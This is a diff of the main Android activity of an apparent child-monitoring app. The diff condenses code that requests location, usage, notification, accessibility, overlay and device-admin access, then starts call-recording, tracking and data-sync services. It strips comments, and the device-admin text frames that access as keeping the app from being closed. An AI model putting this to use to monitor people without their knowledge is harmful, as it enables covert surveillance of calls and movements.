@@ -1,7 +1,6 @@
 package com.abuzahra.tracker
 
 import android.Manifest
-import android.accessibilityservice.AccessibilityService
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
@@ -24,7 +23,6 @@ import com.abuzahra.tracker.receivers.MyDeviceAdminReceiver
 import com.abuzahra.tracker.services.CallRecorderService
 import com.abuzahra.tracker.services.DataSyncWorker
 import com.abuzahra.tracker.services.MainTrackerService
-import com.abuzahra.tracker.services.ScreenCaptureService
 
 class MainActivity : AppCompatActivity() {
 
@@ -32,7 +30,6 @@ class MainActivity : AppCompatActivity() {
     private val PERMISSIONS_REQUEST_CODE = 101
     private var isSetupComplete = false
 
-    // قائمة الأذونات العادية (Runtime Permissions)
     private val runtimePermissions = arrayOf(
         Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.READ_PHONE_STATE,
@@ -48,11 +45,7 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
         webView = findViewById(R.id.webview)
-        
-        // تحميل الواجهة
         setupWebView()
-
-        // بدء عملية طلب الأذونات
         checkAndRequestPermissions()
     }
 
@@ -64,9 +57,8 @@ class MainActivity : AppCompatActivity() {
         webView.webViewClient = WebViewClient()
         webView.loadUrl("file:///android_asset/child_index.html")
     }
-
+    
     private fun checkAndRequestPermissions() {
-        // 1. طلب الأذونات العادية
         val missingPermissions = runtimePermissions.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }.toTypedArray()
@@ -74,7 +66,6 @@ class MainActivity : AppCompatActivity() {
         if (missingPermissions.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missingPermissions, PERMISSIONS_REQUEST_CODE)
         } else {
-            // إذا الأذونات العادية مفعلة، ننتقل للأذونات الخاصة
             validateSpecialPermissions()
         }
     }
@@ -82,60 +73,26 @@ class MainActivity : AppCompatActivity() {
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == PERMISSIONS_REQUEST_CODE) {
-            // نتأكد من الموافقة، ثم ننتقل للخاصة
             validateSpecialPermissions()
         }
     }
-
+    
     private fun validateSpecialPermissions() {
-        // ترتيب الأولويات: البطارية -> النوافذ -> الاستخدام -> الإشعارات -> الوصول -> مسؤول الجهاز
-        
-        // 1. تجاهل تحسينات البطارية
-        if (!isIgnoringBatteryOptimizations()) {
-            requestIgnoreBatteryOptimizations()
-            return // ننتظر العودة من الإعدادات
-        }
+        if (!isIgnoringBatteryOptimizations()) { requestIgnoreBatteryOptimizations(); return }
+        if (!Settings.canDrawOverlays(this)) { startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))); return }
+        if (!hasUsageStatsPermission()) { startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)); return }
+        if (!isNotificationServiceEnabled()) { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")); return }
+        if (!isAccessibilityServiceEnabled()) { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); return }
 
-        // 2. العرض فوق التطبيقات
-        if (!Settings.canDrawOverlays(this)) {
-            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
-            Toast.makeText(this, "مطلوب تفعيل 'Display over other apps'", Toast.LENGTH_LONG).show()
-            return
-        }
-
-        // 3. Usage Stats
-        if (!hasUsageStatsPermission()) {
-            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
-            Toast.makeText(this, "مطلوب تفعيل 'Apps with usage access'", Toast.LENGTH_LONG).show()
-            return
-        }
-
-        // 4. Notification Access
-        if (!isNotificationServiceEnabled()) {
-            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
-            Toast.makeText(this, "مطلوب تفعيل 'Notification Access'", Toast.LENGTH_LONG).show()
-            return
-        }
-
-        // 5. Accessibility
-        if (!isAccessibilityServiceEnabled()) {
-            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-            Toast.makeText(this, "مطلوب تفعيل 'Accessibility Service'", Toast.LENGTH_LONG).show()
-            return
-        }
-
-        // 6. Device Admin
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         val compName = ComponentName(this, MyDeviceAdminReceiver::class.java)
         if (!dpm.isAdminActive(compName)) {
             val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
-            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لحماية التطبيق من الإغلاق")
-            startActivity(intent)
-            return
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لحماية التطبيق")
+            startActivity(intent); return
         }
 
-        // الكل تم تفعيله
         onAllPermissionsGranted()
     }
 
@@ -144,25 +101,20 @@ class MainActivity : AppCompatActivity() {
             isSetupComplete = true
             startAllServices()
             Toast.makeText(this, "تم تفعيل الحماية الكاملة", Toast.LENGTH_SHORT).show()
-            // استدعاء دالة جاهزة في WebView لإخبارها بالبدء
             webView.post { webView.evaluateJavascript("window.onSetupComplete()", null) }
         }
     }
 
     private fun startAllServices() {
-        // 1. خدمة التتبع (الموقع، البطارية)
         val trackerIntent = Intent(this, MainTrackerService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(trackerIntent) else startService(trackerIntent)
 
-        // 2. خدمة تسجيل المكالمات
         val callIntent = Intent(this, CallRecorderService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(callIntent) else startService(callIntent)
 
-        // 3. مزامنة البيانات
         DataSyncWorker.startImmediate(this)
     }
 
-    // Helper Functions
     private fun isIgnoringBatteryOptimizations(): Boolean {
         val pwrm = getSystemService(Context.POWER_SERVICE) as PowerManager
         return pwrm.isIgnoringBatteryOptimizations(packageName)
